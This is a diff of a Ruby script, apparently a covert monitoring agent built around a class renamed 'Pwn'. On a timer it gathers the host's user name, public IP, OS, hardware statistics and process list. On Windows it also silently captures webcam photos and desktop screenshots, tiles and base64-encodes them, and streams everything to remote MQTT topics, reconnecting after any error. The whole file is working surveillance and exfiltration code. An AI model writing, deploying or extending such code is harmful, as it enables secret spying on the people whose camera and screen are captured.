@@ -1,17 +1,19 @@
-require_relative 'client'
-require "base64"
-require 'os'
+require_relative 'pwn'
+require 'base64'
 require 'json'
+require 'os'
 require 'open-uri'
 require 'sys/proctable'
 include Sys
+
+p @ip = open('http://whatismyip.akamai.com').read
 
 def host()
   { :host => OS.windows? ? `whoami`.strip : `uname -n`.strip + '\\' + `whoami`.strip }
 end
 
 def ip()
-  { :ip => open('http://whatismyip.akamai.com').read }
+  { :ip => @ip }
 end
 
 def os()
@@ -97,8 +99,8 @@ end
 def webcam()
   if OS.windows? then
     `WebCamImageSave.exe /capture /Filename webcam.png`
-    `magick mogrify -resize 10% webcam.png`
-     Base64.strict_encode64(File.binread('webcam.png'))
+    `magick mogrify -resize 50% webcam.png`
+    `magick convert -crop 10%x10% webcam.png webcam/webcam%d.png`
   else
     `whoami`
   end
@@ -107,39 +109,68 @@ end
 def desktop()
   if OS.windows? then
     `nircmd.exe savescreenshot desktop.png`
-    `magick mogrify -resize 5% desktop.png`
-     Base64.strict_encode64(File.binread('desktop.png'))
+    `magick mogrify -resize 50% desktop.png`
+    `magick convert -crop 10%x10% desktop.png desktop/desktop%d.png`
   else
     `whoami`
   end
 end
 
-client = Client.new
+pwn = Pwn.new
 
-last_ping_time = Time.now
+# pwn.add_topic_callback('reedleoneil/#') do |message|
+# 	if message.payload != '' then
+# 	  puts message.topic
+# 	  pwn.internals[:mqtt].publish(message.topic, nil, true, 2)
+# 	end
+# end
+
+last_ping_time_host_ip_os = Time.now
+last_ping_time_cpu_memory = Time.now
+last_ping_time_disk_network_process = Time.now
+last_ping_time_webcam_desktop = Time.now
 loop do
 	begin
-		if client.internals[:mqtt].connected? then
-			client.internals[:mqtt].mqtt_loop
-			if last_ping_time <= Time.now - 12 then
-				client.ping
-				last_ping_time = Time.now
-        client.publish('reedleoneil/system_info/host', host().to_json)
-        client.publish('reedleoneil/system_info/ip', ip().to_json, true, 2)
-        client.publish('reedleoneil/system_info/os', os().to_json, true, 2)
-        client.publish('reedleoneil/system_info/cpu', cpu().to_json, true, 2)
-        client.publish('reedleoneil/system_info/memory', memory().to_json, true, 2)
-        client.publish('reedleoneil/system_info/disk', disk().to_json, true, 2)
-        client.publish('reedleoneil/system_info/network', network().to_json, true, 2)
-        client.publish('reedleoneil/system_info/processes', processes().to_json, true, 2)
-        client.publish('reedleoneil/webcam', webcam(), true, 2)
-        client.publish('reedleoneil/desktop', desktop(), true, 2)
+		if pwn.internals[:mqtt].connected? then
+			pwn.internals[:mqtt].mqtt_loop
+      if last_ping_time_host_ip_os <= Time.now - 300 then
+        pwn.publish('reedleoneil/system_info/host', host().to_json)
+        pwn.publish('reedleoneil/system_info/ip', ip().to_json, true, 2)
+        pwn.publish('reedleoneil/system_info/os', os().to_json, true, 2)
+        last_ping_time_host_ip_os = Time.now
+			end
+
+      if last_ping_time_cpu_memory <= Time.now - 3 then
+        pwn.publish('reedleoneil/system_info/cpu', cpu().to_json, true, 2)
+        pwn.publish('reedleoneil/system_info/memory', memory().to_json, true, 2)
+        last_ping_time_cpu_memory = Time.now
+			end
+
+      if last_ping_time_disk_network_process <= Time.now - 30 then
+        pwn.publish('reedleoneil/system_info/disk', disk().to_json, true, 2)
+        pwn.publish('reedleoneil/system_info/network', network().to_json, true, 2)
+        pwn.publish('reedleoneil/system_info/processes', processes().to_json, true, 2)
+        last_ping_time_disk_network_process = Time.now
+			end
+
+      if last_ping_time_webcam_desktop <= Time.now - (30 * 3) then
+        webcam()
+        (0..99).each do |i|
+           w = Base64.strict_encode64(File.binread('webcam/webcam' + i.to_s + '.png'))
+           pwn.publish('reedleoneil/webcam', w, false, 2)
+        end
+        desktop()
+        (0..99).each do |i|
+           d = Base64.strict_encode64(File.binread('desktop/desktop' + i.to_s + '.png'))
+           pwn.publish('reedleoneil/desktop', d, false, 2)
+        end
+        last_ping_time_webcam_desktop = Time.now
 			end
 		else
-			client.connect() if !client.connecting?
+			pwn.connect() if !pwn.connecting?
 		end
 	rescue StandardError => error
 		puts error.full_message
-			client.connect() if !client.connecting?
+			pwn.connect() if !pwn.connecting?
 	end
 end
